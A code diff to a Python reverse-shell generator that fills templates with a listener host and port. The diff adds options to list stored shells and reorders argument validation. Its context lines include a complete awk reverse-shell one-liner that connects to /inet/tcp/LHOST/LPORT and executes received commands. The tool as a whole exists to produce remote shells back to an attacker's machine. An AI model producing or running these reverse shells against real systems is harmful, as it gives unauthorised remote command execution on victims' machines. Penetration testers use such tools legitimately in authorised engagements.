@@ -29,9 +29,11 @@ parser.add_argument('-lp','--lport',metavar='')
 parser.add_argument('-s','--shell',metavar='')
 parser.add_argument('-enc','--encode',metavar='')
 parser.add_argument('-h','--help',action='store_true')
+parser.add_argument('-list','--list',metavar='')
+parser.add_argument('-listall','--listall',action='store_true')
 args = parser.parse_args()
 
-if args.help:
+if args.help or len(argv) == 1:
     usage()
     exit(0)
 
@@ -165,51 +167,68 @@ shells = {
         '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
     }
 }
-
-if not args.shell and not args.lhost:
-    usage()
+# List given shell type if --list flag supplied
+if args.list:
+    for i in shells[args.list]:
+        print(f'==> {i}')
+        print(shells[args.list][i]+"\n")
     exit(0)
-    
-shell = args.shell.lower()
 
-if shell == 'listall':
+# List all available shells if --listalll flag supplied
+if args.listall:
     for i in shells:
-        print("===",i,"==="+"\n")
+        print(f"==> {i}\n")
         for x in shells[i]:
-            print(x+":\n"+shells[i][x])
-        print("\n")
+            print(f"{x} ~ {shells[i][x]}")
+        print("\n")    
     exit(0)
 
-if "netcat" in shell:
-    shell = shell.replace("netcat","nc")
+# Shell must be given
+if not args.shell:
+    print("[!] Shell type must be given")
+    exit(0) 
 
-if '=' in shell:
-    subgroup = shell.split('=')[1]
-    shell = shell.split('=')[0]
-    if subgroup == 'list':
-        print(f"|Shells for {shell}|\n")
-        for i in shells[shell]:
-            print(f"{i}:\n{shells[shell][i]}\n")
-        exit(0)
-    if subgroup not in shells[shell]:
-        print(f"[!] There isn't any {shell} revshell called {subgroup}")
-        exit(0)
-
-if shell.upper() not in available_shells:
-    print(f"[!] There isn't a shell called {shell}\nAvailable shells: {available_shells}")
-    exit(0)
-
+# Lhost must be given
 if not args.lhost:
     print("[!] Lhost must be specified")
     exit(0)
 
+# Get ip from the interface or use user input
 try:
     lhost = net_if_addrs()[args.lhost][0].address
 except:
     lhost = args.lhost
 
-lport = args.lport if args.lport else '4444'
-encode = args.encode if args.encode else None
+# Make shell lowercase to avoid case problems
+shell = args.shell.lower()
+
+# Makes netcat nc so user don't have to remember if it was nc or netcat
+if "netcat" in shell:
+    shell = shell.replace("netcat","nc")
 subgroup = None
 
+# 
+if "=" in shell:
+    subgroup = shell.split("=")[1]
+    shell = shell.split("=")[0]
+
+# Check if shell is in available shells
+if shell.upper() not in available_shells:
+    print(f"[!] There isn't a shell called {shell}\nAvailable shells: {available_shells}")
+    exit(0)
+
+# Check if specific shell name exists
+try:
+    shells[shell][subgroup]
+except:
+    print(f"[-]Name {subgroup} not found in {shell} shells")
+    exit(0)
+
+# Make lport user choice or 4444 by default
+lport = args.lport if args.lport else '4444'
+
+# Make encode user choice or None by default
+encode = args.encode if args.encode else None
+
+# Craft the rshell
 craftingTable(shell)
